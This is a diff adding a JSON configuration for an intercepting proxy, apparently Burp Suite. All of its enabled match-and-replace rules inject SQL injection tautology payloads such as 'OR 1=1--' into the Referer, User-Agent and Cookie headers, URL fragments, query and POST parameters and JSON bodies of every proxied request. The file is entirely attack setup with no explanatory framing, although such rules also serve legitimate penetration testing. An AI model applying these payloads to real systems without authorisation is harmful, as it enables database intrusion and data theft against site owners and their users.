@@ -1,0 +1,62 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "SQLi payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Referer: ",
+                "string_replace": "Referer: ' OR 1=1--"
+            },
+            {
+                "comment": "SQLi payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "User-Agent: ",
+                "string_replace": "User-Agent: ' OR 1=1--"
+            },
+            {
+                "comment": "SQLi payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "Cookie: ",
+                "string_replace": "Cookie: session=' OR '1'='1--"
+            },
+            {
+                "comment": "SQLi payload in query parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=' OR 1=1--"
+            },
+            {
+                "comment": "SQLi payload in URL fragments",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_uri",
+                "string_match": "#",
+                "string_replace": "#' OR 1=1--"
+            },
+            {
+                "comment": "SQLi payload in JSON body",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "\".*\":.*",
+                "string_replace": "\"sqli_payload\":\"' OR '1'='1\""
+            },
+            {
+                "comment": "SQLi payload in POST parameter values",
+                "enabled": true,
+                "is_simple_match": false,
+                "rule_type": "request_body",
+                "string_match": "=.*",
+                "string_replace": "=' OR 1=1--"
+            }
+        ]
+    }
+}
